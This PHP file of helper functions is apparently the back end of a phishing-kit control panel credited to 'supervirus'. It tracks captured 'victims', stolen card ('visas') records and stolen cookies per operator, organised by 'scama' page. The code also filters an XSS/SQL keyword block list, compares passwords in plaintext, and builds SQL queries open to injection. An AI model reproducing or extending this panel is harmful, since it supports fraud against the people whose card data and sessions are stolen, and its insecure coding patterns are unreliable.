<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################
///----------------/////

function error_sql($error,$line,$file){
return 'Error :'.$error.'<br> In Line : '.$line.'<br> In File : '.$file;
}
///------------------///
function protection($string){
    $string = trim($string);
	$string = bad_word($string);
    $string = addslashes($string);
    return $string;
}
//////////////------------------/////////////
function scama_id_by_dir($scama_dir){
$sql_select_scama_id = @mysql_query("SELECT scama_id FROM ".prifex."scamas WHERE scama_dir = '$scama_dir'") or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlrowscamaid = mysql_fetch_object($sql_select_scama_id);
return $sqlrowscamaid->scama_id;
}
//////////--------------/////////
function scama_det_info($filed,$id){
$sql_select_scama_id = @mysql_query("SELECT $filed FROM ".prifex."scamas WHERE scama_id = '$id'") or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlrowscamaid = mysql_fetch_object($sql_select_scama_id);
return $sqlrowscamaid->$filed;
}
////------------------------///////
function redirect(){
$referer = $_SERVER['HTTP_REFERER'];
echo '<META HTTP-EQUIV="Refresh" CONTENT="3;URL='.$referer.'">';
}
///////------------------//////
function redirect2(){
$referer = $_SERVER['HTTP_REFERER'];
echo '<META HTTP-EQUIV="Refresh" CONTENT="0;URL='.$referer.'">';
}
///-----------------------///
function all_vic_by_scama($scama){
$sql_select_all_victims_by_this_scama = @mysql_query("SELECT victime_id FROM ".prifex."victims WHERE victime_scama = '$scama' and victime_user_id = '".user_id."'") or die (error_sql(mysql_error(),__LINE__,__FILE__));$sql_num_rows = mysql_num_rows($sql_select_all_victims_by_this_scama);
return $sql_num_rows;
}
///------------------------///
function check_inputs($type,$value1, $value2){
if($type == 'checkbox' or $type == 'radio'){
	if ($value1 == $value2) {
		$value = 'CHECKED';
	}else {
		$value = '';
	}
}elseif($type == 'select'){
	if ($value1 == $value2) {
		$value = 'selected';
	}else {
		$value = '';
	}
}
return $value;
}
///////////////--------------------------/////
function replacerbr($var){
$var = str_ireplace(';',';<br/>',$var);
return $var ;
}
////////-------------------////////
function date_normal($date_time){
$date = date("l d M Y",$date_time);
$time = date("H:i:s",$date_time);
$date = str_ireplace('Monday','Mon',$date);
$date = str_ireplace('Tuesday','Tue',$date);
$date = str_ireplace('Wednesday','Wed',$date);
$date = str_ireplace('Thursday','Thu',$date);
$date = str_ireplace('Friday','Fri',$date);
$date = str_ireplace('Sunday','Sun',$date);
$date = str_ireplace('Saturday','Sat',$date);
$date = str_ireplace('Jan','Jan',$date);
$date = str_ireplace('Feb','Feb',$date);
$date = str_ireplace('Mar','Mar',$date);
$date = str_ireplace('Apr','Apr',$date);
$date = str_ireplace('May','May',$date);
$date = str_ireplace('Jun','Jun',$date);
$date = str_ireplace('Jul','Jul',$date);
$date = str_ireplace('Aug','Aug',$date);
$date = str_ireplace('Sep','Sep',$date);
$date = str_ireplace('Oct','Oct',$date);
$date = str_ireplace('Nov','Nov',$date);
$date = str_ireplace('Dec','Dec',$date);
return $date.'<br />'.$time;
}

///////--------------------//////
function bad_word($string){
global $badword;
$new_word = '-- كلمة ممنوعة --';
$bad_word_sql = explode(",",$badword);
$basmir =  Array('script','meta','SCRIPT','META','location','document','window','onabort', 'onactivate', 'onafterprint',
'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste',
'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu',
'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate',
'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange',
'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture',
'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend',
'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit',
'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload','javascript',
'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe','frame', 'frameset', 'ilayer', 'bgsound',
'base', 'union', 'UNION', 'select', 'SELECT', 'mysql', 'MYSQL',
'shell', 'SHELL', 'Refresh', 'content');
$string = str_ireplace($basmir,$new_word,$string);
$string = str_ireplace($bad_word_sql,$new_word,$string);
return $string;
}
//////////----------------------////////////////
function class_page($page){
global $do;
	if($page == 'not_ex' and $do == ''){
		$class = 'class="active"';
	}elseif($page == $do){
		$class = 'class="active"';
	}else{
		$class = '';
	}
return $class;
}
//----------------------------/////
function cont_new_victims($id_user){
$date = time()-60*60*24;
$where =  "and  victime_date > '$date'";
$sqlselectvictimesuser = @mysql_query("SELECT victime_id FROM ".prifex."victims WHERE victime_user_id = '".$id_user."' AND victime_deleted  = '0' ".$where."")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
//----------------------------/////
function cont_new_visas($id_user){
$date = time()-60*60*24;
$where =  "AND  date > '$date'";
$sqlselectvictimesuser = @mysql_query("SELECT visa_id FROM ".prifex."visas WHERE user_id_victim = '".$id_user."' AND visa_deleted = '0' ".$where."")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
//----------------------------/////
function cont_new_coockies($id_user){
$date = time()-60*60*24;
$where =  "AND  date_coockie > '$date'";
$sqlselectvictimesuser = @mysql_query("SELECT coockie_id FROM ".prifex."coockies WHERE user_id_coockie = '".$id_user."' AND coockie_deleted != '1' ".$where."")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
////////-------------------------////////////////
function cont_all_victims($id_user){
$sqlselectvictimesuser = @mysql_query("SELECT victime_id FROM ".prifex."victims WHERE victime_user_id = '".$id_user."' AND victime_deleted  = '0'")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
////////-------------------------////////////////
function cont_all_visas($id_user){
$sqlselectvictimesuser = @mysql_query("SELECT visa_id FROM ".prifex."visas WHERE user_id_victim = '".$id_user."' AND visa_deleted = '0'")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
////////-------------------------////////////////
function cont_all_coockies($id_user){
$sqlselectvictimesuser = @mysql_query("SELECT coockie_id FROM ".prifex."coockies WHERE user_id_coockie = '".$id_user."' AND coockie_deleted != '1'")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumvictimesuser = mysql_num_rows($sqlselectvictimesuser);
mysql_free_result($sqlselectvictimesuser);
return $sqlnumvictimesuser;
}
/////////------------------------/////////////
function is_in_db($username){
$sqlselectvictimesuser = @mysql_query("SELECT user_id FROM ".prifex."users  WHERE user_name = '".$username."' ")or die (error_sql(mysql_error(),__LINE__,__FILE__));
$sqlnumuser = mysql_num_rows($sqlselectvictimesuser);
 if($sqlnumuser > 0){
 $turn = true;
 }else{
 $turn = false;
 }
return $turn;
}
//////-------------------------------///////////////
function check_pass($user,$pass){
$sqlslectinfouser = @mysql_query("SELECT user_password FROM ".prifex."users WHERE user_name = '".$user."'")or die(error_sql(mysql_error(),__LINE__,__FILE__));
$resultselectinfouser = mysql_fetch_object($sqlslectinfouser);
$user_password = $resultselectinfouser->user_password;
	if($pass == $user_password){
	return true;
	}else{
	return false;
	}
}
////-------------------------------------//////////////
function title_page(){
global $site_name,$do;
switch($do){
	case '':
		$title_page = ' ';
	break;
	case 'cp_admin':
		$title_page = 'Control panel';
	break;
	case 'victims':
		$title_page = 'Victims';
	break;
	case 'register':
		$title_page = 'Register';
	break;
	default:
		$title_page = ' ';
	break;
}
echo '<title>'.$site_name.' - '.$title_page.'</title>';
}
?>